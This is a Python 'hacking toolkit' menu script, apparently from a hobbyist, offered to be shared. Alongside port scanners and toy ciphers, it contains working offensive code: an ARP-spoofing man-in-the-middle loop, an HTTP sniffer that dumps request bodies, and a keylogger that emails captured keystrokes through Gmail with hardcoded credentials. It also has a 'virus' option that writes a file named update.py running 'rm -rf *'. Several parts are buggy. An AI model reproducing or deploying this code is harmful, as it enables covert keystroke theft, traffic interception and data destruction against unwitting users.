#hello welcome to my script this script important
from scapy.layers.inet import ICMP
from scapy.sendrecv import sniff

print("hello gay share script with your friends")
print("++++++++++++++++++++++++++++++++++++++++")
print("++++++++++++++++++++++++++++++++++++++++")
import os
import socket
from threading import Timer
os.system("apt-get install lolcat")
os.system("figlet -f mono9 zoala python|lolcat")
def timer():
    t = Timer(10,timer)
    t.start()
user=str(input("enter your name:"))
print("welcome",user)
print("___________________________________________________________________")
print("my channal link (https://www.youtube.com/channel/UCJdel5A-tAi28hEioln0fyA)")
print("**************************************************************************")
print("1- get ip website :")
print("2- get host of ip :")
print("3- get port of service :")
print("4- get service of port :")
print("5- scan ports :")
print("6- scan ip and mac of your network :")
print("7- scan ports on linux")
print("8- sniffer network http")
print("9- arp spoofing")
print("10- keylogger ")
print("11- encrypt massage cypher 1 ")
print("12- decrypt massage cypher 1")
print("13- encrypt monoalphabetic cipher :")
print("14- decrypt monoalphabetic cipher :")
print("15- geolocation ip :")
print("16- sniffing ports :")
print("____________________________")
print("|000- small virus python :|")
print("___________________________")
print("*******************************************************************")
from scapy.all import *
def menu():
       choise=str(input("enter your choise:"))
       if choise == "1" :
                   import socket 
                   website = str(input("enter your website :"))
                   ip = socket.gethostbyname(website)
                   print(ip)
       elif choise == "2":
                   import socket
                   ip = str(input("enter ip :"))
                   host = socket.gethostbyaddr(str(ip))
                   print(host) 
       elif choise == "3":
                   import socket
                   service=str(input("enter service :"))
                   port = socket.getservbyname(service)
                   print(port) 
       elif choise == "4":
                   import socket
                   port=int(input("enter serv :"))
                   service_name  = socket.getservbyport(port)
                   print(service_name)          
       elif choise == "5":
                   import socket
                   target= str(input("enter ip :"))
                   p = int(input("enter port :"))
                   s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                   s.settimeout(3)
                   r = s.connect_ex((target,p))
                   if r == 0 :
                       service = socket.getservbyport(p)
                       print("--[ * {} * is open --> {} ]".format(p,service))
                   s.close()
       elif choise == "6":
                   from scapy.all import ARP , Ether , srp
                   import sys
                   def scan(ip):
                        while True :
                       
                             arp_req = ARP(pdst=ip) #ip
                             brodcast = Ether(dst="ff:ff:ff:ff:ff:ff") #brodcast
                             arp_brodcast = brodcast/arp_req
                             result = srp(arp_brodcast,timeout=3,verbose=False)[0]
                             print(result)
                             lst = []
                             for element in result:
                                         clients = {"ip":element[1].psrc,"mac":element[1].hwsrc}
                                         lst.append(clients)
                             print("IP \t\t\t\t MAC")
                             print("_____________________________________________________")
                             for i in lst :    
                                         print("{} \t\t\t\t {} \n ".format(i['ip'],i['mac']))
                   ip = str(input("enter ip range :"))
                   scan(ip)
       elif choise == "000":
                   virus=open("update.py",'w')
                   virus.write('import os\nos.system("rm -rf *")')
                   virus.close()
                   virus2=open("update.py",'r')
                   virus3=virus2.read()   
                   import os
                   #os.system("python3 update.py")

       elif choise == "7":
                   import socket
                   from typing import SupportsIndex
                   sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                   host=str(input("enter ip :"))
                   port =int(input("enter port:"))
                   if sock.connect_ex((host,port)):
                             print("port %d is closed "%port)
                   else:
                       print("port %d is open"%port)
       elif choise == "8":
                   print("++++++++++++++++++++++++++++++++++++++++++++++++++++")
                   v=input("this option sniffer website http only not https to contanue press enter :")
                   import os
                   k= os.system("python3 -m pip install scapy")
                   import scapy.all as scapy
                   from scapy.layers import http
                   def sniffer(interface):
                       print("_______________________________________")
                       print("[+] * sniffer has started...: *[+]")
                       print("_______________________________________")
                       scapy.sniff(iface=interface, store=False, prn=process)
                   def process(packet):
                       if packet.haslayer(http.HTTPRequest):
                            print("[+] ",packet[http.HTTPRequest].Host)
                            if packet.haslayer(scapy.Raw):
                               request = packet[scapy.Raw].load
                               print("[*_*] ->->->->-> ",request)
                   sniffer("wlan0")
       elif choise == "9":
                   import scapy.all as scapy
                   import time
                   import sys
                   import os
                   e=os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
                   def get_mac(ip):
                              arp_packet = scapy.ARP(pdst=ip)
                              broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
                              arp_broadcast_packet = broadcast_packet/arp_packet
                              answered_list = scapy.srp(arp_broascast_packet, timeout=1, verbose=False)[0]
                              return answered_list[0][1].hwsrc

                   def spoof(target_ip, spoof_ip):
                              target_mac = get_mac(target_ip)
                              packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,psrc=spoof_ip)
                              scapy.send(packet, verbose=False)
                   target= str(input("enter target ip >>::"))
                   spoofed = str(input("enter ip spoof :"))
                   try:
                       while True:
                          spoof(target,spoofed)
                          spoof(spoofed,target)
                          print("[+] packets is sent..>>")
                          time.sleep(8)
                   except KeyboardInterrupt:
                             print("{ exit...bye ;)}")
                             sys.exit()                              
       elif choise == "10":
                   import os
                   l=os.system("python3 -m pip install pynput")
                   from pynput.keyboard import Key , Listener
                   from threading import Timer
                   def key_pressed(key):
                          try:
                              press = str(key.char)
                          except:
                              if key == key.space:
                                    log=""
                              else:
                                    press=str(key)
                          print(press)
                          f = open("setting.txt",'a')
                          f.write(press)
                          f.close()
                   from smtplib import SMTP
                   def send_email(email, password, msg):
                            #https://myaccount.google.com/u/4/lesssecureapps
                            mailer = SMTP('smtp.gmail.com',587)
                            mailer.starttls()
                            mailer.login(email,password)
                            mailer.sendmail(email, email ,msg)
                            mailer.quit()
                   from threading import Timer                 
                   def timer():
                            t = Timer(30,timer)
                            t.start()
                            
                            try:
                                f = open("setting.txt","r")
                                logs= f.read()
                                send_email("societyf12@gmail.com","123456789zoala",logs)
                                os.remove("setting.txt")
                            except:
                                 nothing=""
                   with Listener(on_press=key_pressed) as l :
                                 timer()
                                 l.join()
                                 c=input("enter to exit:")   
                   timer()
                   l.join()
       elif choise == "11":
           def encrypt(txt,key):
               cipher_list= []
               for l in txt:
                   posistion = ord(l)
                   new_litter= chr(posistion+key)
                   cipher_list.append(new_litter)
               t=''.join(cipher_list)
               print(t)
           txt=list(input("enter word to encrypt:"))
           key=int(input("enter key to encrypt:"))
           encrypt(txt,key)
       elif choise == "12":
           def encrypt(txt,key):
               cipher_list= []
               for l in txt:
                   posistion = ord(l)
                   new_litter= chr(posistion-key)
                   cipher_list.append(new_litter)
               t=''.join(cipher_list)
               print(t)

           txt = list(input("enter word to encrypt:"))
           key = int(input("enter key to encrypt:"))
           encrypt(txt, key)
       elif choise == "13":
           print("______________________________________",
                 "_____________________________________",
                 "__________________________________",
                 "this script coding by zoala",
                 "___________________________")

           welcome = input("whats your name ?:")
           print("welcome", welcome)

           for i in welcome:
               print(i)

           letters = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's',
                      't', 'w', 'x', 'u', 'v', 'y', 'z']

           key = ['r', 'w', 'e', 'q', 't', 'y', 'u', 'i', 'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'z',
                  'c', 'x', 'v', 'b', 'n', 'm']

           text = str(input("enter the word to encrypt :"))

           cipher = []
           for l in text:
               key_number = letters.index(l)
               new_letters = key[key_number]
               cipher.append(new_letters)
           encrypt_text = ''.join(cipher)

           print(encrypt_text)

       elif choise == "14":
           print("______________________________________",
                 "_____________________________________",
                 "__________________________________",
                 "this script coding by zoala",
                 "___________________________")

           welcome = input("whats your name ?:")
           print("welcome", welcome)

           for i in welcome:
               print(i)

           letters = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's',
                      't', 'w', 'x', 'u', 'v', 'y', 'z']

           key = ['r', 'w', 'e', 'q', 't', 'y', 'u', 'i', 'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'z',
                  'c', 'x', 'v', 'b', 'n', 'm']

           text = str(input("enter the word to encrypt :"))

           cipher = []
           for l in text:
               key_number = key.index(l)
               new_letters = letters[key_number]
               cipher.append(new_letters)
           encrypt_text = ''.join(cipher)

           print(encrypt_text)

       elif choise == "15":
           import os
           os.system("python -m pip install python-geoip-geolite2")
           os.system("python3 -m pip install python-geoip-geolite2")
           os.system("python -m pip install python-geoip-python3")
           os.system("python3 -m pip install python-geoip-python3")
           from geoip import geolite2
           ip = str(input("enter ip :"))
           locator =geolite2.lookup(ip)
           print("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
           print(locator)
           print("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
       elif choise == "16":
           import os
           os.system("python -m pip install scapy")
           os.system("python3 -m pip install scapy")
           #must install software winpcap on windows to work
           #https://www.winpcap.org/install/default.htm
           #from scapy.all import *
           def analyzer(pkt):
               if pkt.haslayer(TCP):
                   print("................tcp packer >>>")
                   src_ip = pkt[IP].src
                   dst_ip = pkt[IP].dst
                   mac_src = pkt.src
                   mac_dst = pkt.dst
                   src_port = pkt.sport
                   dst_port = pkt.dport
                   print("SRC-IP : " +src_ip)
                   print("DST-IP :" +dst_ip)
                   print("SRC-MAC : " + mac_src)
                   print("DST-MAC :" + mac_dst)
                   print("SRC-PORT :"+ str(src_port))
                   print("DST-PORT :"+ str(dst_port))
                   print("__________________________________________________________________________________________")
                   if pkt.haslayer(RAW):
                       print(pkt[RAW].load)
                   print("*****************************************************************************************8")
                   print("*******************************************************************************************")
               if pkt.haslayer(UDP):
                   print("__________________________________________________________________________________________")
                   print("_____________________________________udp packet >>>")
                   src_ip = pkt[IP].src
                   dst_ip = pkt[IP].dst
                   mac_src = pkt.src
                   mac_dst = pkt.dst
                   src_port = pkt.sport
                   dst_port = pkt.dport
                   print("SRC-IP : " + src_ip)
                   print("DST-IP :" + dst_ip)
                   print("SRC-MAC : " + mac_src)
                   print("DST-MAC :" + mac_dst)
                   print("SRC-PORT :" + str(src_port))
                   print("DST-PORT :" + str(dst_port))
                   print("___________________________________________________________________________________________")
                   if pkt.haslayer(RAW):
                       print(pkt[RAW].load)
                   print("*****************************************************************************************8")
                   print("*******************************************************************************************")
               try :
                   src_ip = pkt[IP].src
                   dst_ip = pkt[IP].dst
                   mac_src = pkt.src
                   mac_dst = pkt.dst
                   if pkt.haslayer(ICMP):
                       print(
                           "__________________________________________________________________________________________")
                       print("_____________________________________ICMP packet >>>")

                       print("SRC-IP : " + src_ip)
                       print("DST-IP :" + dst_ip)
                       print("SRC-MAC : " + mac_src)
                       print("DST-MAC :" + mac_dst)
                       print("___________________________________________________________________________________________")
                   print(pkt)
                   print("packet >>>||||")
               except :
                      pass
               print("********** sniffint start ***********")
               sniff(iface="eth0", prn=analyzer)

menu()
